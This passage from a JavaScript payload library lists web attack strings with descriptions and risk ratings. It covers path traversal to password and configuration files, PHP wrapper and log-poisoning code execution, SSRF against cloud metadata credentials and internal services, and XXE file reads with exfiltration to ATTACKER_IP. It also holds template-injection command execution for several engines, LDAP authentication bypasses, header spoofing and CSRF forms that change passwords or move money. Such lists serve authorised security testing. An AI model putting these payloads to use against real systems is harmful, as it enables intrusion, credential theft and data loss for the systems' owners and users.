    payload: "..\\..\\..\\..\\Windows\\system.ini",
    desc: "Read Windows system.ini",
    risk: "high"
  },
  {
    cat: "LFI",
    name: "Windows hosts",
    payload: "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    desc: "Read Windows hosts file",
    risk: "medium"
  },
  {
    cat: "LFI",
    name: "Windows SAM",
    payload: "..\\..\\..\\..\\Windows\\System32\\config\\SAM",
    desc: "Attempt to read SAM database (password hashes)",
    risk: "critical"
  },
  {
    cat: "LFI",
    name: "IIS web.config",
    payload: "..\\..\\..\\..\\inetpub\\wwwroot\\web.config",
    desc: "Read IIS configuration (may contain connection strings)",
    risk: "critical"
  },

  // --- Null Byte ---
  {
    cat: "LFI",
    name: "Null byte (PHP < 5.3)",
    payload: "../../../../etc/passwd%00",
    desc: "Null byte truncation to bypass file extension appending (PHP < 5.3.4)",
    risk: "high"
  },
  {
    cat: "LFI",
    name: "Null byte (.php bypass)",
    payload: "../../../../etc/passwd%00.php",
    desc: "Null byte to strip forced .php extension",
    risk: "high"
  },

  // --- Double Encoding ---
  {
    cat: "LFI",
    name: "Double-encoded traversal",
    payload: "..%252f..%252f..%252f..%252fetc%252fpasswd",
    desc: "Double URL-encoded path traversal for double-decode scenarios",
    risk: "high"
  },
  {
    cat: "LFI",
    name: "UTF-8 overlong encoding",
    payload: "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    desc: "UTF-8 overlong dot encoding to bypass filters",
    risk: "high"
  },
  {
    cat: "LFI",
    name: "URL-encoded dot-dot",
    payload: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    desc: "URL-encoded directory traversal characters",
    risk: "high"
  },
  {
    cat: "LFI",
    name: "Dot-dot backslash encoded",
    payload: "..%5c..%5c..%5c..%5cWindows%5cwin.ini",
    desc: "URL-encoded backslash traversal for Windows",
    risk: "high"
  },

  // --- PHP Wrapper Chains ---
  {
    cat: "LFI",
    name: "PHP filter base64",
    payload: "php://filter/convert.base64-encode/resource=index.php",
    desc: "PHP wrapper to read source code as base64",
    risk: "high"
  },
  {
    cat: "LFI",
    name: "PHP filter rot13",
    payload: "php://filter/string.rot13/resource=index.php",
    desc: "PHP wrapper to read source via ROT13 encoding",
    risk: "high"
  },
  {
    cat: "LFI",
    name: "PHP input wrapper",
    payload: "php://input",
    desc: "PHP input wrapper for code execution via POST body",
    risk: "critical"
  },
  {
    cat: "LFI",
    name: "PHP data wrapper",
    payload: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    desc: "PHP data wrapper to execute inline PHP code (base64)",
    risk: "critical"
  },
  {
    cat: "LFI",
    name: "PHP expect wrapper",
    payload: "expect://id",
    desc: "PHP expect wrapper for direct command execution",
    risk: "critical"
  },
  {
    cat: "LFI",
    name: "PHP zip wrapper",
    payload: "zip://uploads/evil.zip%23shell.php",
    desc: "PHP zip wrapper to access file inside uploaded ZIP",
    risk: "critical"
  },
  {
    cat: "LFI",
    name: "PHP phar wrapper",
    payload: "phar://uploads/evil.phar/shell.php",
    desc: "PHP phar wrapper for deserialization or file access",
    risk: "critical"
  },
  {
    cat: "LFI",
    name: "PHP filter chain RCE",
    payload: "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp",
    desc: "PHP filter chain technique for RCE without file upload",
    risk: "critical"
  },
  {
    cat: "LFI",
    name: "Bypass (doubled slash)",
    payload: "....//....//....//etc/passwd",
    desc: "Doubled traversal to bypass single ../ stripping",
    risk: "high"
  },
  {
    cat: "LFI",
    name: "Bypass (dot truncation)",
    payload: "../../../../etc/passwd............................................................................................................................................................................................................................................................",
    desc: "Long trailing dots for path truncation on older systems",
    risk: "medium"
  },
  {
    cat: "LFI",
    name: "Bypass (absolute path)",
    payload: "/etc/passwd",
    desc: "Direct absolute path when traversal is filtered but absolute paths are not",
    risk: "high"
  },
  {
    cat: "LFI",
    name: "Log poisoning (User-Agent)",
    payload: "../../../../var/log/apache2/access.log (with User-Agent: <?php system($_GET['cmd']); ?>)",
    desc: "LFI + log poisoning: inject PHP via User-Agent header then include log file",
    risk: "critical"
  },
  {
    cat: "LFI",
    name: "Log poisoning (SSH auth log)",
    payload: "../../../../var/log/auth.log (login as: <?php system($_GET['cmd']); ?>)",
    desc: "LFI + SSH auth log poisoning for RCE",
    risk: "critical"
  },

  // ==========================================================================
  // SSRF (25 payloads)
  // ==========================================================================

  {
    cat: "SSRF",
    name: "Localhost (127.0.0.1)",
    payload: "http://127.0.0.1/admin",
    desc: "SSRF to access localhost admin panel",
    risk: "high"
  },
  {
    cat: "SSRF",
    name: "Localhost (localhost)",
    payload: "http://localhost/admin",
    desc: "SSRF using localhost hostname",
    risk: "high"
  },
  {
    cat: "SSRF",
    name: "Localhost (IPv6)",
    payload: "http://[::1]/admin",
    desc: "SSRF using IPv6 loopback address",
    risk: "high"
  },
  {
    cat: "SSRF",
    name: "Localhost (0.0.0.0)",
    payload: "http://0.0.0.0/admin",
    desc: "SSRF using 0.0.0.0 wildcard binding",
    risk: "high"
  },
  {
    cat: "SSRF",
    name: "Localhost (decimal)",
    payload: "http://2130706433/admin",
    desc: "SSRF using decimal representation of 127.0.0.1",
    risk: "high"
  },
  {
    cat: "SSRF",
    name: "Localhost (hex)",
    payload: "http://0x7f000001/admin",
    desc: "SSRF using hexadecimal representation of 127.0.0.1",
    risk: "high"
  },
  {
    cat: "SSRF",
    name: "Localhost (octal)",
    payload: "http://0177.0.0.1/admin",
    desc: "SSRF using octal representation of 127.0.0.1",
    risk: "high"
  },
  {
    cat: "SSRF",
    name: "Localhost (short form)",
    payload: "http://127.1/admin",
    desc: "SSRF using shortened 127.1 loopback form",
    risk: "high"
  },
  {
    cat: "SSRF",
    name: "AWS metadata (IMDSv1)",
    payload: "http://169.254.169.254/latest/meta-data/",
    desc: "AWS EC2 instance metadata service v1 (no token needed)",
    risk: "critical"
  },
  {
    cat: "SSRF",
    name: "AWS metadata IAM creds",
    payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    desc: "AWS IAM role credential extraction via SSRF",
    risk: "critical"
  },
  {
    cat: "SSRF",
    name: "AWS metadata user-data",
    payload: "http://169.254.169.254/latest/user-data/",
    desc: "AWS user-data (may contain startup scripts with secrets)",
    risk: "critical"
  },
  {
    cat: "SSRF",
    name: "GCP metadata",
    payload: "http://metadata.google.internal/computeMetadata/v1/ (Header: Metadata-Flavor: Google)",
    desc: "GCP instance metadata with required header",
    risk: "critical"
  },
  {
    cat: "SSRF",
    name: "Azure metadata",
    payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Header: Metadata: true)",
    desc: "Azure instance metadata service with required header",
    risk: "critical"
  },
  {
    cat: "SSRF",
    name: "DigitalOcean metadata",
    payload: "http://169.254.169.254/metadata/v1/",
    desc: "DigitalOcean droplet metadata endpoint",
    risk: "critical"
  },
  {
    cat: "SSRF",
    name: "Internal service (Redis)",
    payload: "http://127.0.0.1:6379/",
    desc: "SSRF to probe internal Redis service",
    risk: "high"
  },
  {
    cat: "SSRF",
    name: "Internal service (Elasticsearch)",
    payload: "http://127.0.0.1:9200/_cat/indices",
    desc: "SSRF to enumerate Elasticsearch indices",
    risk: "high"
  },
  {
    cat: "SSRF",
    name: "Internal service (Docker API)",
    payload: "http://127.0.0.1:2375/containers/json",
    desc: "SSRF to Docker daemon API (unauthenticated)",
    risk: "critical"
  },
  {
    cat: "SSRF",
    name: "Internal service (Kubernetes)",
    payload: "https://kubernetes.default.svc/api/v1/namespaces",
    desc: "SSRF to Kubernetes API server from within a pod",
    risk: "critical"
  },
  {
    cat: "SSRF",
    name: "Internal service (Consul)",
    payload: "http://127.0.0.1:8500/v1/agent/members",
    desc: "SSRF to Consul agent for service discovery",
    risk: "high"
  },

  // --- Protocol Smuggling ---
  {
    cat: "SSRF",
    name: "File protocol",
    payload: "file:///etc/passwd",
    desc: "SSRF using file:// protocol to read local files",
    risk: "critical"
  },
  {
    cat: "SSRF",
    name: "Gopher protocol (Redis)",
    payload: "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
    desc: "SSRF via Gopher protocol to send raw Redis commands",
    risk: "critical"
  },
  {
    cat: "SSRF",
    name: "Dict protocol",
    payload: "dict://127.0.0.1:6379/INFO",
    desc: "SSRF via DICT protocol to probe Redis",
    risk: "high"
  },
  {
    cat: "SSRF",
    name: "DNS rebinding bypass",
    payload: "http://rebind.attacker.com/ (resolves to internal IP after TTL)",
    desc: "DNS rebinding to bypass SSRF hostname validation",
    risk: "critical"
  },
  {
    cat: "SSRF",
    name: "URL shortener bypass",
    payload: "http://tinyurl.com/xxxxx (redirects to 127.0.0.1)",
    desc: "SSRF filter bypass via URL shortener redirect",
    risk: "high"
  },
  {
    cat: "SSRF",
    name: "Redirect bypass (@)",
    payload: "http://attacker.com@127.0.0.1/admin",
    desc: "Bypass URL validation using @ to embed real target as host",
    risk: "high"
  },

  // ==========================================================================
  // XXE - XML External Entity (22 payloads)
  // ==========================================================================

  // --- File Read ---
  {
    cat: "XXE",
    name: "Basic file read (Linux)",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
    desc: "Classic XXE to read /etc/passwd via SYSTEM entity",
    risk: "critical"
  },
  {
    cat: "XXE",
    name: "Basic file read (Windows)",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///C:/Windows/win.ini\">]><root>&xxe;</root>",
    desc: "XXE to read win.ini on Windows targets",
    risk: "critical"
  },
  {
    cat: "XXE",
    name: "PHP filter XXE",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><root>&xxe;</root>",
    desc: "XXE with PHP filter wrapper for base64 encoded file read",
    risk: "critical"
  },
  {
    cat: "XXE",
    name: "File read (netrc)",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///root/.netrc\">]><root>&xxe;</root>",
    desc: "XXE to read .netrc file (may contain FTP/HTTP credentials)",
    risk: "critical"
  },

  // --- SSRF via XXE ---
  {
    cat: "XXE",
    name: "SSRF via XXE (localhost)",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:80/\">]><root>&xxe;</root>",
    desc: "XXE to perform SSRF against localhost",
    risk: "high"
  },
  {
    cat: "XXE",
    name: "SSRF via XXE (AWS metadata)",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>",
    desc: "XXE to access AWS instance metadata",
    risk: "critical"
  },
  {
    cat: "XXE",
    name: "SSRF via XXE (internal scan)",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://192.168.1.1/\">]><root>&xxe;</root>",
    desc: "XXE for internal network scanning",
    risk: "high"
  },
  {
    cat: "XXE",
    name: "Port scan via XXE",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:PORT/\">]><root>&xxe;</root>",
    desc: "XXE-based port scanning (iterate PORT value)",
    risk: "high"
  },

  // --- Blind XXE ---
  {
    cat: "XXE",
    name: "Blind XXE (OOB via HTTP)",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://ATTACKER_IP/xxe\"> %xxe;]><root>test</root>",
    desc: "Blind XXE detection via out-of-band HTTP callback",
    risk: "high"
  },
  {
    cat: "XXE",
    name: "Blind XXE (OOB data exfil)",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://ATTACKER_IP/evil.dtd\"> %dtd;]><root>&send;</root>",
    desc: "Blind XXE data exfiltration via external DTD",
    risk: "critical"
  },
  {
    cat: "XXE",
    name: "Blind XXE (error-based)",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">%eval;%error;]>",
    desc: "Error-based blind XXE: leaked data appears in error message",
    risk: "critical"
  },
  {
    cat: "XXE",
    name: "Blind XXE (DNS OOB)",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://xxe.ATTACKER_DOMAIN/\"> %xxe;]>",
    desc: "Blind XXE detection via DNS callback",
    risk: "high"
  },

  // --- Parameter Entities ---
  {
    cat: "XXE",
    name: "Parameter entity (basic)",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://ATTACKER_IP/evil.dtd\"> %xxe;]><root>test</root>",
    desc: "XXE using parameter entity to load external DTD",
    risk: "high"
  },
  {
    cat: "XXE",
    name: "Parameter entity (nested)",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % a SYSTEM \"http://ATTACKER_IP/evil.dtd\"> %a; %b; %c;]><root>&exfil;</root>",
    desc: "Nested parameter entity chain for multi-stage exfiltration",
    risk: "critical"
  },
  {
    cat: "XXE",
    name: "XInclude injection",
    payload: "<root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></root>",
    desc: "XXE via XInclude when you cannot control the DOCTYPE",
    risk: "high"
  },
  {
    cat: "XXE",
    name: "SVG file upload XXE",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>",
    desc: "XXE via malicious SVG file upload",
    risk: "critical"
  },
  {
    cat: "XXE",
    name: "XLSX XXE (xl/workbook.xml)",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><workbook>&xxe;</workbook>",
    desc: "XXE in XLSX file (modify xl/workbook.xml inside the ZIP)",
    risk: "critical"
  },
  {
    cat: "XXE",
    name: "DOCX XXE",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><document>&xxe;</document>",
    desc: "XXE in DOCX file (modify word/document.xml inside the ZIP)",
    risk: "critical"
  },
  {
    cat: "XXE",
    name: "SOAP XXE",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>",
    desc: "XXE in SOAP XML request body",
    risk: "critical"
  },
  {
    cat: "XXE",
    name: "XXE via Content-Type",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root> (Content-Type: application/xml)",
    desc: "Force XML parsing by changing Content-Type header",
    risk: "high"
  },
  {
    cat: "XXE",
    name: "XXE via JSON to XML",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root> (replace JSON body)",
    desc: "Switch JSON endpoint to XML if parser supports both",
    risk: "high"
  },
  {
    cat: "XXE",
    name: "Billion laughs (DoS)",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\"><!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">]><root>&lol4;</root>",
    desc: "XML bomb / billion laughs entity expansion DoS attack",
    risk: "high"
  },

  // ==========================================================================
  // SSTI - Server-Side Template Injection (25 payloads)
  // ==========================================================================

  // --- Jinja2 (Python) ---
  {
    cat: "SSTI",
    name: "Jinja2 detection (math)",
    payload: "{{7*7}}",
    desc: "Detect SSTI by checking if 49 is rendered",
    risk: "high"
  },
  {
    cat: "SSTI",
    name: "Jinja2 detection (string)",
    payload: "{{7*'7'}}",
    desc: "Detect Jinja2 specifically: renders 7777777",
    risk: "high"
  },
  {
    cat: "SSTI",
    name: "Jinja2 config leak",
    payload: "{{config}}",
    desc: "Dump Flask/Jinja2 application configuration",
    risk: "critical"
  },
  {
    cat: "SSTI",
    name: "Jinja2 secret key",
    payload: "{{config['SECRET_KEY']}}",
    desc: "Extract Flask SECRET_KEY from config",
    risk: "critical"
  },
  {
    cat: "SSTI",
    name: "Jinja2 RCE (subprocess)",
    payload: "{{''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()}}",
    desc: "Jinja2 RCE via subprocess.Popen (index may vary)",
    risk: "critical"
  },
  {
    cat: "SSTI",
    name: "Jinja2 RCE (os.popen)",
    payload: "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    desc: "Jinja2 RCE via cycler globals accessing os module",
    risk: "critical"
  },
  {
    cat: "SSTI",
    name: "Jinja2 RCE (lipsum)",
    payload: "{{lipsum.__globals__['os'].popen('id').read()}}",
    desc: "Jinja2 RCE using lipsum function globals",
    risk: "critical"
  },
  {
    cat: "SSTI",
    name: "Jinja2 RCE (request)",
    payload: "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    desc: "Jinja2 RCE via request object traversal",
    risk: "critical"
  },
  {
    cat: "SSTI",
    name: "Jinja2 file read",
    payload: "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
    desc: "Jinja2 file read via file subclass (index may vary)",
    risk: "critical"
  },

  // --- Twig (PHP) ---
  {
    cat: "SSTI",
    name: "Twig detection",
    payload: "{{7*7}}",
    desc: "Detect Twig SSTI (renders 49)",
    risk: "high"
  },
  {
    cat: "SSTI",
    name: "Twig RCE (system)",
    payload: "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
    desc: "Twig RCE via filter callback registration (Twig < 3)",
    risk: "critical"
  },
  {
    cat: "SSTI",
    name: "Twig file read",
    payload: "{{'/etc/passwd'|file_excerpt(0,100)}}",
    desc: "Twig file read using file_excerpt filter",
    risk: "high"
  },
  {
    cat: "SSTI",
    name: "Twig RCE (Twig 3)",
    payload: "{{['id']|filter('system')}}",
    desc: "Twig 3 RCE using filter function with system callback",
    risk: "critical"
  },
  {
    cat: "SSTI",
    name: "Twig RCE (map)",
    payload: "{{['id']|map('system')|join}}",
    desc: "Twig RCE using map filter with system callback",
    risk: "critical"
  },

  // --- Freemarker (Java) ---
  {
    cat: "SSTI",
    name: "Freemarker detection",
    payload: "${7*7}",
    desc: "Detect Freemarker SSTI (renders 49)",
    risk: "high"
  },
  {
    cat: "SSTI",
    name: "Freemarker RCE (Execute)",
    payload: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
    desc: "Freemarker RCE via Execute utility class",
    risk: "critical"
  },
  {
    cat: "SSTI",
    name: "Freemarker RCE (ObjectConstructor)",
    payload: "<#assign oc=\"freemarker.template.utility.ObjectConstructor\"?new()>${oc(\"java.lang.Runtime\").getRuntime().exec(\"id\")}",
    desc: "Freemarker RCE via ObjectConstructor and Runtime.exec",
    risk: "critical"
  },
  {
    cat: "SSTI",
    name: "Freemarker file read",
    payload: "<#assign is=object?api.class.getResourceAsStream(\"/etc/passwd\")>${is}",
    desc: "Freemarker file read via class resource stream",
    risk: "high"
  },

  // --- Smarty (PHP) ---
  {
    cat: "SSTI",
    name: "Smarty detection",
    payload: "{7*7}",
    desc: "Detect Smarty SSTI (renders 49 with single braces)",
    risk: "high"
  },
  {
    cat: "SSTI",
    name: "Smarty RCE (system)",
    payload: "{system('id')}",
    desc: "Smarty direct function call RCE",
    risk: "critical"
  },
  {
    cat: "SSTI",
    name: "Smarty RCE (if tag)",
    payload: "{if system('id')}{/if}",
    desc: "Smarty RCE via conditional tag",
    risk: "critical"
  },

  // --- Pebble (Java) ---
  {
    cat: "SSTI",
    name: "Pebble detection",
    payload: "{{7*7}}",
    desc: "Detect Pebble SSTI (renders 49)",
    risk: "high"
  },
  {
    cat: "SSTI",
    name: "Pebble RCE",
    payload: "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}{{bytes}}",
    desc: "Pebble RCE via reflection to Runtime.exec",
    risk: "critical"
  },

  // --- ERB (Ruby) ---
  {
    cat: "SSTI",
    name: "ERB detection",
    payload: "<%= 7*7 %>",
    desc: "Detect ERB SSTI (renders 49)",
    risk: "high"
  },
  {
    cat: "SSTI",
    name: "ERB RCE",
    payload: "<%= system('id') %>",
    desc: "ERB RCE via system() call",
    risk: "critical"
  },

  // ==========================================================================
  // LDAP INJECTION (17 payloads)
  // ==========================================================================

  {
    cat: "LDAPi",
    name: "Auth bypass (tautology)",
    payload: "*)(uid=*))(|(uid=*",
    desc: "LDAP tautology injection for authentication bypass",
    risk: "critical"
  },
  {
    cat: "LDAPi",
    name: "Auth bypass (wildcard user)",
    payload: "*",
    desc: "Wildcard to match any user in LDAP query",
    risk: "critical"
  },
  {
    cat: "LDAPi",
    name: "Auth bypass (OR)",
    payload: "admin)(|(password=*)",
    desc: "LDAP OR injection to bypass password check",
    risk: "critical"
  },
  {
    cat: "LDAPi",
    name: "User enumeration",
    payload: "*)(&",
    desc: "Inject to modify filter and enumerate users",
    risk: "high"
  },
  {
    cat: "LDAPi",
    name: "Attribute extraction",
    payload: "*)(objectClass=*",
    desc: "Extract all objects regardless of class",
    risk: "high"
  },
  {
    cat: "LDAPi",
    name: "Admin group check",
    payload: "*)(memberOf=cn=admin,dc=company,dc=com",
    desc: "Inject to check admin group membership",
    risk: "high"
  },
  {
    cat: "LDAPi",
    name: "Boolean true (AND)",
    payload: "admin)(&)",
    desc: "LDAP AND true tautology for blind testing",
    risk: "high"
  },
  {
    cat: "LDAPi",
    name: "Boolean false (OR)",
    payload: "admin)(|)",
    desc: "LDAP OR false for blind testing differential",
    risk: "high"
  },
  {
    cat: "LDAPi",
    name: "Wildcard password",
    payload: "*)(&(userPassword=*)",
    desc: "Wildcard password match in LDAP filter",
    risk: "critical"
  },
  {
    cat: "LDAPi",
    name: "Blind char extraction (a*)",
    payload: "admin)(userPassword=a*",
    desc: "Blind LDAP injection to extract password character-by-character",
    risk: "critical"
  },
  {
    cat: "LDAPi",
    name: "Null injection",
    payload: "admin)%00",
    desc: "Null byte to truncate LDAP query",
    risk: "high"
  },
  {
    cat: "LDAPi",
    name: "Nested OR injection",
    payload: "*(|(mail=*))",
    desc: "Nested OR to enumerate all email addresses",
    risk: "high"
  },
  {
    cat: "LDAPi",
    name: "ObjectClass person enum",
    payload: "*)(objectClass=person)(cn=*",
    desc: "Enumerate all person objects",
    risk: "high"
  },
  {
    cat: "LDAPi",
    name: "Search filter escape bypass",
    payload: "admin\\29\\28",
    desc: "Escaped parentheses to bypass input sanitization",
    risk: "high"
  },
  {
    cat: "LDAPi",
    name: "DN injection",
    payload: "admin,ou=users,dc=evil,dc=com",
    desc: "DN injection to redirect bind to attacker-controlled directory",
    risk: "critical"
  },
  {
    cat: "LDAPi",
    name: "Wildcard with class filter",
    payload: "*)(objectClass=inetOrgPerson",
    desc: "Enumerate inetOrgPerson class entries",
    risk: "high"
  },
  {
    cat: "LDAPi",
    name: "Multiple attribute extraction",
    payload: "*)(|(cn=*)(sn=*)(mail=*)",
    desc: "Extract multiple attributes via OR chain",
    risk: "high"
  },

  // ==========================================================================
  // HEADER INJECTION (18 payloads)
  // ==========================================================================

  // --- Host Header ---
  {
    cat: "HeaderInj",
    name: "Host header (password reset)",
    payload: "Host: evil.com",
    desc: "Override Host header to capture password reset links",
    risk: "high"
  },
  {
    cat: "HeaderInj",
    name: "Host header (double)",
    payload: "Host: target.com\\r\\nHost: evil.com",
    desc: "Double Host header to confuse routing/caching",
    risk: "high"
  },
  {
    cat: "HeaderInj",
    name: "X-Forwarded-Host override",
    payload: "X-Forwarded-Host: evil.com",
    desc: "Override forwarded host for cache poisoning or reset links",
    risk: "high"
  },
  {
    cat: "HeaderInj",
    name: "X-Host override",
    payload: "X-Host: evil.com",
    desc: "Non-standard X-Host header for host override",
    risk: "high"
  },
  {
    cat: "HeaderInj",
    name: "X-Original-URL",
    payload: "X-Original-URL: /admin",
    desc: "Bypass path-based access controls via X-Original-URL",
    risk: "high"
  },
  {
    cat: "HeaderInj",
    name: "X-Rewrite-URL",
    payload: "X-Rewrite-URL: /admin",
    desc: "Bypass WAF/proxy path rules via X-Rewrite-URL",
    risk: "high"
  },

  // --- X-Forwarded-For ---
  {
    cat: "HeaderInj",
    name: "XFF IP spoof (localhost)",
    payload: "X-Forwarded-For: 127.0.0.1",
    desc: "Spoof source IP as localhost to bypass IP restrictions",
    risk: "high"
  },
  {
    cat: "HeaderInj",
    name: "XFF IP spoof (internal)",
    payload: "X-Forwarded-For: 10.0.0.1",
    desc: "Spoof source IP as internal network address",
    risk: "high"
  },
  {
    cat: "HeaderInj",
    name: "XFF chain spoof",
    payload: "X-Forwarded-For: 127.0.0.1, 10.0.0.1, 192.168.1.1",
    desc: "Spoofed XFF chain to confuse IP parsing logic",
    risk: "high"
  },
  {
    cat: "HeaderInj",
    name: "X-Real-IP spoof",
    payload: "X-Real-IP: 127.0.0.1",
    desc: "Spoof X-Real-IP header for IP-based auth bypass",
    risk: "high"
  },
  {
    cat: "HeaderInj",
    name: "X-Client-IP spoof",
    payload: "X-Client-IP: 127.0.0.1",
    desc: "Spoof X-Client-IP for IP whitelist bypass",
    risk: "high"
  },
  {
    cat: "HeaderInj",
    name: "True-Client-IP spoof",
    payload: "True-Client-IP: 127.0.0.1",
    desc: "Spoof Akamai/Cloudflare True-Client-IP header",
    risk: "high"
  },

  // --- Referer ---
  {
    cat: "HeaderInj",
    name: "Referer injection (XSS)",
    payload: "Referer: https://evil.com/<script>alert(1)</script>",
    desc: "XSS via Referer header if logged/reflected unsanitized",
    risk: "high"
  },
  {
    cat: "HeaderInj",
    name: "Referer injection (SQLi)",
    payload: "Referer: ' OR 1=1--",
    desc: "SQL injection via Referer header if used in queries",
    risk: "high"
  },

  // --- Response Splitting ---
  {
    cat: "HeaderInj",
    name: "CRLF injection (header)",
    payload: "value%0d%0aInjected-Header: injected",
    desc: "CRLF injection to add arbitrary response headers",
    risk: "high"
  },
  {
    cat: "HeaderInj",
    name: "CRLF injection (XSS)",
    payload: "value%0d%0a%0d%0a<script>alert(1)</script>",
    desc: "CRLF injection for HTTP response splitting with XSS",
    risk: "critical"
  },
  {
    cat: "HeaderInj",
    name: "CRLF injection (cookie set)",
    payload: "value%0d%0aSet-Cookie: session=evil",
    desc: "CRLF injection to set arbitrary cookies",
    risk: "high"
  },
  {
    cat: "HeaderInj",
    name: "CRLF injection (redirect)",
    payload: "value%0d%0aLocation: http://evil.com",
    desc: "CRLF injection to force redirect via Location header",
    risk: "high"
  },

  // ==========================================================================
  // CSRF - Cross-Site Request Forgery (16 payloads)
  // ==========================================================================

  {
    cat: "CSRF",
    name: "Auto-submit form (POST)",
    payload: "<html><body><form action=\"https://target.com/change-email\" method=\"POST\"><input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\"/></form><script>document.forms[0].submit()</script></body></html>",
    desc: "Auto-submitting CSRF form to change victim email",
    risk: "high"
  },
  {
    cat: "CSRF",
    name: "Auto-submit form (password)",
    payload: "<html><body><form action=\"https://target.com/change-password\" method=\"POST\"><input type=\"hidden\" name=\"password\" value=\"hacked123\"/><input type=\"hidden\" name=\"confirm\" value=\"hacked123\"/></form><script>document.forms[0].submit()</script></body></html>",
    desc: "CSRF to change victim password",
    risk: "critical"
  },
  {
    cat: "CSRF",
    name: "Image tag GET",
    payload: "<img src=\"https://target.com/api/delete-account?confirm=true\" style=\"display:none\">",
    desc: "CSRF via image tag for GET-based state-changing action",
    risk: "high"
  },
  {
    cat: "CSRF",
    name: "XHR-based CSRF",
    payload: "<script>var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/api/transfer',true);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.withCredentials=true;xhr.send('to=attacker&amount=10000');</script>",
    desc: "CSRF via XMLHttpRequest with credentials",
    risk: "critical"
  },
  {
    cat: "CSRF",
    name: "Fetch-based CSRF",
    payload: "<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'role=admin'});</script>",
    desc: "CSRF via fetch API with included credentials",
    risk: "critical"
  },
  {
    cat: "CSRF",
    name: "JSON body CSRF",
    payload: "<html><body><form action=\"https://target.com/api/update\" method=\"POST\" enctype=\"text/plain\"><input name='{\"role\":\"admin\",\"ignore\":\"' value='\"}' type=\"hidden\"/></form><script>document.forms[0].submit()</script></body></html>",
    desc: "CSRF with JSON body via form enctype=text/plain trick",
    risk: "high"
  },
  {
    cat: "CSRF",
    name: "Multipart CSRF",
    payload: "<html><body><form action=\"https://target.com/upload\" method=\"POST\" enctype=\"multipart/form-data\"><input type=\"hidden\" name=\"file\" value=\"malicious content\"/></form><script>document.forms[0].submit()</script></body></html>",
    desc: "CSRF with multipart form data encoding",
